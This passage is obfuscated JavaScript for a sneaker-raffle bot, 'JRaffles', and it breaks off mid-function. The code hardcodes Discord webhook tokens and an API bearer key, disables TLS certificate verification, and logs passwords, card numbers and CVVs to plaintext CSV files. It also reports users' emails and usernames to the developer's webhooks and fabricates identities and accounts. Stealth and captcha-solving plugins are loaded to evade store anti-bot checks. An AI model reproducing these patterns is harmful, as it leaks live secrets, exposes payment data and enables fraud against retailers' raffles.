process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x467c3c = require('fs'), _0x39727a = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x47918e(_0x198b91) {
    const _0x1a4ad4 = _0x467c3c['createWriteStream'](_0x198b91, { 'flags': 'a' }), _0x4e9372 = console['log'];
    console['log'] = function () {
        const _0x57a5ee = Array['prototype']['slice']['call'](arguments), _0x368908 = _0x57a5ee['join']('\x20') + '\x0a';
        _0x1a4ad4['write'](_0x368908), _0x4e9372['apply'](console, _0x57a5ee);
    };
}
_0x47918e('../logs/log\x20' + _0x39727a);
var _0x199838 = require('tough-cookie'), _0x3a8843 = require('node-imap'), _0x1ba9b7 = require('util')['inspect'];
const _0xbb5a33 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x28a5e8 } = require('discord.js');
var _0x66bc65 = require('exe');
const { execFile: _0x205337 } = require('child_process'), _0x23c50c = require('puppeteer-extra'), _0x1b94bb = require('puppeteer-extra-plugin-recaptcha'), _0x9505fd = require('puppeteer-extra-plugin-stealth'), _0x1ee8dd = require('chalk'), _0x18a4ea = require('node-bash-title'), _0x3036f9 = require('axios'), _0x416c9b = require('papaparse');
var _0x4fbec9 = require('random-name');
const _0x29b460 = require('request');
var _0x13036b = require('prompt');
const _0x160c4b = _0x29b460['jar']();
var _0x5b5c1b = {};
const _0x66c575 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x4f3050 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x41223b = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x107bd9 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x3cbc28 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x1f8156 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x442c27 = 'https://discord.com/api/webhooks/', _0x49d8e2 = '' + _0x442c27 + _0x41223b, _0x2caac5 = '' + _0x442c27 + _0x107bd9, _0x5748ab = '' + _0x442c27 + _0x66c575, _0x57f30c = '' + _0x442c27 + _0x4f3050, _0x155517 = '' + _0x442c27 + _0x3cbc28, _0x52401a = '' + _0x442c27 + _0x1f8156;
const _0x237b86 = JSON['parse'](_0x467c3c['readFileSync']('../package.json', 'utf-8')), _0x300b57 = _0x237b86['version'];
var _0x2e7789, _0x34cb85, _0x4fe8c9, _0x36f15f, _0x121c8c, _0x693ba2, _0x5b6a98, _0x55e710;
const _0x5012f9 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x3b4b14 = ![];
const _0x5b3cf5 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x27ae65 = '0123456789';
var _0x57b1e8 = _0x5b3cf5['split']('');
const _0x319b69 = require('auto-git-update'), _0x3bae60 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x374a8b = new _0x319b69(_0x3bae60);
async function _0x38bce6() {
    _0x121c8c = _0x467c3c['readdirSync']('../proxies'), _0x36f15f = _0x467c3c['readdirSync']('../tasks'), !_0x467c3c['existsSync']('../accounts/fenom.csv') && _0x467c3c['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x467c3c['existsSync']('../accounts/paypal.csv') && _0x467c3c['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x467c3c['existsSync']('../accounts/bstn.csv') && _0x467c3c['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x467c3c['existsSync']('../accounts/eql.csv') && _0x467c3c['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x467c3c['existsSync']('../failed-tasks.csv') && _0x467c3c['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x467c3c['existsSync']('../successful-tasks.csv') && _0x467c3c['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x5b5c1b = JSON['parse'](_0x467c3c['readFileSync']('../settings.json', 'utf-8')), !_0x5b5c1b['delay'] && (_0x5b5c1b['delay'] = 0x3c, _0x467c3c['writeFileSync']('../settings.json', JSON['stringify'](_0x5b5c1b, null, 0x2))), !_0x5b5c1b['masterMail'] && (_0x5b5c1b['masterMail'] = 'yourmail@gmail.com', _0x467c3c['writeFileSync']('../settings.json', JSON['stringify'](_0x5b5c1b, null, 0x2))), !_0x5b5c1b['masterPassword'] && (_0x5b5c1b['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x467c3c['writeFileSync']('../settings.json', JSON['stringify'](_0x5b5c1b, null, 0x2))), !_0x5b5c1b['captchaKey'] && (_0x5b5c1b['captchaKey'] = '', _0x467c3c['writeFileSync']('../settings.json', JSON['stringify'](_0x5b5c1b, null, 0x2))), !_0x5b5c1b['useRandomProxy'] && (_0x5b5c1b['useRandomProxy'] = !![], _0x467c3c['writeFileSync']('../settings.json', JSON['stringify'](_0x5b5c1b, null, 0x2))), !_0x5b5c1b['shuffleTasks'] && (_0x5b5c1b['shuffleTasks'] = ![], _0x467c3c['writeFileSync']('../settings.json', JSON['stringify'](_0x5b5c1b, null, 0x2))), !_0x5b5c1b['webhook'] && (_0x5b5c1b['webhook'] = '', _0x467c3c['writeFileSync']('../settings.json', JSON['stringify'](_0x5b5c1b, null, 0x2))), _0x5b5c1b['delay'] <= 0x1388 && (_0x5b5c1b['delay'] = _0x5b5c1b['delay'] * 0x3e8), _0x5b5c1b['AfewDelay'] && (delete _0x5b5c1b['AfewDelay'], _0x467c3c['writeFileSync']('../settings.json', JSON['stringify'](_0x5b5c1b, null, 0x2))), _0x5b5c1b['MahaDelay'] && (delete _0x5b5c1b['MahaDelay'], _0x467c3c['writeFileSync']('../settings.json', JSON['stringify'](_0x5b5c1b, null, 0x2))), _0x5b5c1b['footshopDelay'] && (delete _0x5b5c1b['footshopDelay'], _0x467c3c['writeFileSync']('../settings.json', JSON['stringify'](_0x5b5c1b, null, 0x2))), _0x5b5c1b['MahaDelay'] = _0x5b5c1b['delay'], _0x442c27 = _0x5b5c1b['webhook'], _0x693ba2 = _0x5b5c1b['licenseKey'];
}
let _0x378369, _0x590300 = [], _0x4f0f02;
const _0x101cd5 = _0x22c649 => new Promise(_0x46764f => setTimeout(_0x46764f, _0x22c649));
function _0xf4c879(_0x4c02a2, _0xea5f97) {
    return Math['floor'](Math['random']() * (_0xea5f97 - _0x4c02a2 + 0x1) + _0x4c02a2);
}
function _0x2539fa(_0xbeeec4) {
    let _0x36a756 = _0xbeeec4['length'], _0x888364;
    while (_0x36a756 != 0x0) {
        _0x888364 = Math['floor'](Math['random']() * _0x36a756), _0x36a756--, [_0xbeeec4[_0x36a756], _0xbeeec4[_0x888364]] = [
            _0xbeeec4[_0x888364],
            _0xbeeec4[_0x36a756]
        ];
    }
    return _0xbeeec4;
}
async function _0x59b308(_0x2ec475) {
    return _0x3036f9['get']('https://api.hyper.co/v4/licenses/' + _0x2ec475, { 'headers': { 'Authorization': 'Bearer\x20' + _0x5012f9 } })['then'](_0x480c68 => _0x480c68['data'])['catch'](() => null);
}
;
async function _0x4f6800(_0xbe4aed) {
    console['clear']();
    if (_0xbe4aed == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x11dbad = await _0x13036b['get']('License');
        if (_0x11dbad['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x101cd5(0xbb8), _0x4f6800(_0xbe4aed);
        _0xbe4aed = _0x11dbad['License'], _0x5b5c1b['licenseKey'] = _0xbe4aed, _0x693ba2 = _0xbe4aed, _0x467c3c['writeFileSync']('../settings.json', JSON['stringify'](_0x5b5c1b));
    }
    console['log']('Checking\x20license\x20' + _0x693ba2 + '...'), await _0x101cd5(0x320);
    const _0x596364 = await _0x59b308(_0xbe4aed);
    _0x5b6a98 = JSON['stringify'](_0x596364['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x55e710 = JSON['stringify'](_0x596364['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x596364)
        return console['log']('License\x20not\x20found');
    if (!_0x596364['user'])
        return console['log']('License\x20not\x20bound');
    return _0x596364['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x3b4b14 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x3b4b14 = ![]);
}
async function _0x574580() {
    var _0xa7734d = await _0x13036b['get']('Module');
    return console['clear'](), _0xa7734d['Module'];
}
;
async function _0x4659d4() {
    var _0x3f6df3 = await _0x13036b['get']('Setting');
    return console['clear'](), _0x3f6df3['Setting'];
}
async function _0x2cac6f(_0x3b96f9) {
    var _0x3ac8df = [];
    for (file of _0x36f15f) {
        var _0x5a2fbd = _0x467c3c['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x416c9b['parse'](_0x5a2fbd, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x3b96f9['store'] && _0x3ac8df['push'](file);
    }
    !_0x3ac8df['length'] == 0x0 && (_0x36f15f = _0x3ac8df);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x1ad5fb = 0x0; _0x1ad5fb < _0x36f15f['length']; _0x1ad5fb++) {
        console['log']('\x20(' + _0x1ad5fb + ')\x20' + _0x36f15f[_0x1ad5fb]);
    }
    console['log']('');
    var _0xc2d8c9 = await _0x13036b['get']('Task');
    if (_0xc2d8c9['Task'] > _0x36f15f['length'] - 0x1 || isNaN(_0xc2d8c9['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x101cd5(0x3e8), _0x2cac6f();
    var _0x4599f7 = _0x467c3c['readFileSync']('../tasks/' + _0x36f15f[_0xc2d8c9['Task']], 'utf-8');
    return _0x4fe8c9 = _0x416c9b['parse'](_0x4599f7, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x1ee8dd['blue'](_0x36f15f[_0xc2d8c9['Task']])), _0x2e7789 = _0x36f15f[_0xc2d8c9['Task']], _0x4fe8c9;
}
async function _0x3fe8ad() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x29fe14 = 0x0; _0x29fe14 < _0x121c8c['length']; _0x29fe14++) {
        console['log']('\x20(' + _0x29fe14 + ')\x20' + _0x121c8c[_0x29fe14]);
    }
    console['log']('');
    var _0x3e239f = await _0x13036b['get']('Proxies');
    if (_0x3e239f['Proxies'] > _0x121c8c['length'] - 0x1 || isNaN(_0x3e239f['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x101cd5(0x3e8), _0x3fe8ad();
    var _0xe70adf = _0x467c3c['readFileSync']('../proxies/' + _0x121c8c[_0x3e239f['Proxies']], 'utf-8')['split']('\x0a');
    let _0x37cb3e = _0xe70adf['map']((_0x3400bd, _0xbb4039) => {
        sanatizeProxy = _0x3400bd['replace']('\x0d', '');
        if (_0xe70adf[_0xbb4039 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x34cb85 = _0x121c8c[_0x3e239f['Proxies']], console['clear'](), _0x37cb3e;
}
async function _0x29f821() {
    var _0xb48331 = await _0x13036b['get']('Value');
    return console['clear'](), _0xb48331['Value'];
}
async function _0x3e5094(_0x344f88) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x4079ea = 0x0; _0x4079ea < _0x344f88['length']; _0x4079ea++) {
        console['log']('\x20(' + _0x4079ea + ')\x20[' + _0x344f88[_0x4079ea]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x57b3a7 = await _0x13036b['get']('Module');
    return _0x57b3a7['Module'];
}
async function _0x45b34b() {
    var _0x4dccf0 = await _0x13036b['get']('Password');
    return console['clear'](), _0x4dccf0['Password'];
}
;
async function _0x56c595() {
    var _0x2bfa2c = await _0x13036b['get']('Links');
    return _0x2bfa2c['Links'];
}
;
async function _0x453212() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x420c18 = 0x0; _0x420c18 < _0x590300['length']; _0x420c18++) {
        console['log']('\x20(' + _0x420c18 + ')\x20' + _0x590300[_0x420c18]);
    }
    ;
    console['log']();
    let _0x5edc6e = await _0x13036b['get']('Product');
    return console['clear'](), _0x5edc6e['Product'];
}
;
function _0x235b96() {
    var _0x14ccd2 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x14ccd2;
}
;
function _0x51c4b7() {
    var _0x1976e2 = new Date(Date['now']())['toLocaleString']();
    return _0x1976e2['replace'](',', '');
}
async function _0x3b1b09(_0x36e33e, _0x51f9fb) {
    let _0x1a47b2 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x300b57 != 'devkey') {
        await _0x3036f9['post'](_0x36e33e, _0x51f9fb, _0x1a47b2);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x42c912(_0x4f9c51, _0x2a34c8, _0x17ae62, _0x4f812e, _0x16f0e1) {
    if (!_0x4f812e && _0x17ae62 == 'dev') {
        var _0x2dbaa5 = new _0x28a5e8()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x2a34c8['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x2a34c8['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x4f9c51['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x5b5c1b['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x5b6a98,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x4f9c51['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x4f9c51['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x300b57,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x2dbaa5['data'];
    } else {
        if (_0x4f812e && _0x17ae62 == 'dev') {
            var _0x2dbaa5 = new _0x28a5e8()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x2a34c8['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x5b6a98,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x2a34c8['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x4f9c51['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x5b5c1b['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x16f0e1,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x4f9c51['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x4f9c51['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x300b57,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x2dbaa5['data'];
        } else {
            if (_0x17ae62 == 'pub') {
                var _0x2dbaa5 = new _0x28a5e8()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x2a34c8['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x2a34c8['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x4f9c51['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x5b5c1b['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x4f9c51['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x300b57,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x2dbaa5['data'];
            } else {
                if (_0x17ae62 == 'acc' && !_0x4f812e) {
                    var _0x2dbaa5 = new _0x28a5e8()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x2a34c8['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x5b6a98,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x2a34c8['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x5b5c1b['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x300b57,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x2dbaa5['data'];
                } else {
                    if (_0x17ae62 == 'acc' && _0x4f812e) {
                        var _0x2dbaa5 = new _0x28a5e8()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x2a34c8['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x5b6a98,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x16f0e1,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x2a34c8['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x5b5c1b['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x300b57,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x2dbaa5['data'];
                    } else {
                        if (_0x17ae62 == 'open') {
                            var _0x2dbaa5 = new _0x28a5e8()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x55e710)['addFields']({
                                'name': 'User',
                                'value': '' + _0x5b6a98,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x300b57,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x2dbaa5['data'];
                        } else {
                            if (!_0x4f812e && _0x17ae62 == 'ver') {
                                var _0x2dbaa5 = new _0x28a5e8()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x2a34c8['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x5b6a98,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x2a34c8['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x5b5c1b['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x300b57,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x2dbaa5['data'];
                            } else {
                                if (_0x4f812e && _0x17ae62 == 'ver') {
                                    var _0x2dbaa5 = new _0x28a5e8()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x2a34c8['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x5b6a98,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x16f0e1,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x2a34c8['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x5b5c1b['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x300b57,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x2dbaa5['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x15925d(_0x1b3cca, _0x3d60c9) {
    var _0x32b21a = _0x1b3cca[_0x3d60c9]['Address1']['split'](''), _0x72c8ed = _0x1b3cca[_0x3d60c9]['Address2']['split'](''), _0x265bb7 = _0x1b3cca[_0x3d60c9]['Email']['split']('@');
    for (var _0x4d522f = 0x0; _0x4d522f < _0x32b21a['length']; _0x4d522f++) {
        if (_0x32b21a[_0x4d522f] == 'X') {
            var _0x5d5956 = Math['round'](Math['random']() * (_0x5b3cf5['length'] - 0x1));
            _0x32b21a[_0x4d522f] = _0x57b1e8[_0x5d5956];
        }
    }
    ;
    for (var _0x4d522f = 0x0; _0x4d522f < _0x72c8ed['length']; _0x4d522f++) {
        if (_0x72c8ed[_0x4d522f] == 'X') {
            var _0x5d5956 = Math['round'](Math['random']() * (_0x5b3cf5['length'] - 0x1));
            _0x72c8ed[_0x4d522f] = _0x57b1e8[_0x5d5956];
        }
    }
    ;
    _0x1b3cca[_0x3d60c9]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x1b3cca[_0x3d60c9]['FirstName'] = _0x4fbec9['first']());
    _0x1b3cca[_0x3d60c9]['LastName']['toUpperCase']() == 'RANDOM' && (_0x1b3cca[_0x3d60c9]['LastName'] = _0x4fbec9['last']());
    _0x265bb7[0x0]['toUpperCase']() == 'RANDOM' ? _0x265bb7[0x0] = '' + _0x4fbec9['first']() + _0x4fbec9['last']() + _0xf4c879(0x1, 0x270f) + '@' : _0x265bb7[0x0] = _0x265bb7[0x0] + '@';
    _0x1b3cca[_0x3d60c9]['Email'] = _0x265bb7['join'](''), _0x1b3cca[_0x3d60c9]['Address1'] = _0x32b21a['join'](''), _0x1b3cca[_0x3d60c9]['Address2'] = _0x72c8ed['join']('');
    _0x1b3cca[_0x3d60c9]['Phone'] == 'RANDOM' && (_0x1b3cca[_0x3d60c9]['Phone'] = '0' + _0xf4c879(0x5f5e100, 0x3b9ac9ff));
    if (_0x1b3cca[_0x3d60c9]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x2d9e7f = _0xf4c879(0x1, 0x270f);
        _0x1b3cca[_0x3d60c9]['Follower'] = '' + _0x4fbec9['first']() + _0x4fbec9['last']() + _0x2d9e7f + '\x20';
    }
    _0x1b3cca[_0x3d60c9]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x1b3cca[_0x3d60c9]['HouseNumber'] = _0xf4c879(0x1, 0xc8));
    if (_0x1b3cca[_0x3d60c9]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x24ecce = Math['round'](Math['random']() * (_0x5b3cf5['length'] - 0x1)), _0x309c61 = _0x57b1e8[_0x24ecce];
        _0x1b3cca[_0x3d60c9]['Address1'] = _0x4fbec9['last']() + 'straat', _0x1b3cca[_0x3d60c9]['Zip'] == '' && (_0x1b3cca[_0x3d60c9]['Postcode'] = _0xf4c879(0x3e8, 0x270f) + '\x20' + _0x309c61 + _0x309c61, _0x1b3cca[_0x3d60c9]['Zip'] = _0x1b3cca[_0x3d60c9]['Postcode']), _0x1b3cca[_0x3d60c9]['HouseNumber'] = '' + _0xf4c879(0x1, 0xc8);
    }
    return;
}
;
async function _0x3802e1(_0x31ff05, _0x5f568a) {
    _0x467c3c['appendFileSync']('../failed-tasks.csv', _0x51c4b7() + ',' + _0x5f568a['store'] + ',' + _0x5f568a['name'] + ',' + _0x31ff05['Url'] + ',' + _0x31ff05['Size'] + ',' + _0x31ff05['Follower'] + ',' + _0x31ff05['FirstName'] + ',' + _0x31ff05['LastName'] + ',' + _0x31ff05['Address1'] + ',' + _0x31ff05['Address2'] + ',' + _0x31ff05['HouseNumber'] + ',' + _0x31ff05['Zip'] + ',' + _0x31ff05['City'] + ',' + _0x31ff05['State'] + ',' + _0x31ff05['Country'] + ',' + _0x31ff05['Phone'] + ',' + _0x31ff05['Email'] + ',' + _0x31ff05['Password'] + ',' + _0x31ff05['PaymentMethod'] + ',' + _0x31ff05['CardType'] + ',' + _0x31ff05['NameOnCard'] + ',' + _0x31ff05['CardNumber'] + ',' + _0x31ff05['ExpiryDate'] + ',' + _0x31ff05['CVV'] + ',' + _0x31ff05['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x30fd17(_0x1a7920, _0x5eb5c9) {
    _0x467c3c['appendFileSync']('../successful-tasks.csv', _0x51c4b7() + ',' + _0x5eb5c9['store'] + ',' + _0x5eb5c9['name'] + ',' + _0x1a7920['Url'] + ',' + _0x1a7920['Size'] + ',' + _0x1a7920['Follower'] + ',' + _0x1a7920['FirstName'] + ',' + _0x1a7920['LastName'] + ',' + _0x1a7920['Address1'] + ',' + _0x1a7920['Address2'] + ',' + _0x1a7920['HouseNumber'] + ',' + _0x1a7920['Zip'] + ',' + _0x1a7920['City'] + ',' + _0x1a7920['State'] + ',' + _0x1a7920['Country'] + ',' + _0x1a7920['Phone'] + ',' + _0x1a7920['Email'] + ',' + _0x1a7920['Password'] + ',' + _0x1a7920['PaymentMethod'] + ',' + _0x1a7920['CardType'] + ',' + _0x1a7920['NameOnCard'] + ',' + _0x1a7920['CardNumber'] + ',' + _0x1a7920['ExpiryDate'] + ',' + _0x1a7920['CVV'] + ',' + _0x1a7920['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x4596c5() {
    let _0x4afe9c = proxyFile['split']('\x0a'), _0x273b84 = _0x4afe9c['map']((_0x40cd1b, _0xdbdcbf) => {
        sanatizeProxy = _0x40cd1b['replace']('\x0d', '');
        if (_0x4afe9c[_0xdbdcbf + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x273b84;
}
;
async function _0x35c7d6(_0x4b84db, _0x3e1a90) {
    if (_0xfc1bcc != 'yes')
        var _0xfc1bcc = '', _0x284a4c = 0x0;
    async function _0x3341ad() {
        var _0x388703 = _0x467c3c['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x17cf89 = _0x416c9b['parse'](_0x388703, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x501f3c = 0x0; _0x501f3c < _0x17cf89['length']; _0x501f3c++) {
            console['log']('(' + _0x501f3c + ')\x20' + _0x17cf89[_0x501f3c]['Email']);
        }
        console['log']('\x0a(' + _0x17cf89['length'] + ')\x20' + _0x1ee8dd['cyan']('Add\x20a\x20new\x20account'));
        let _0x2f49d2 = await _0x13036b['get']('Option');
        if (_0x2f49d2['Option'] < _0x17cf89['length'])
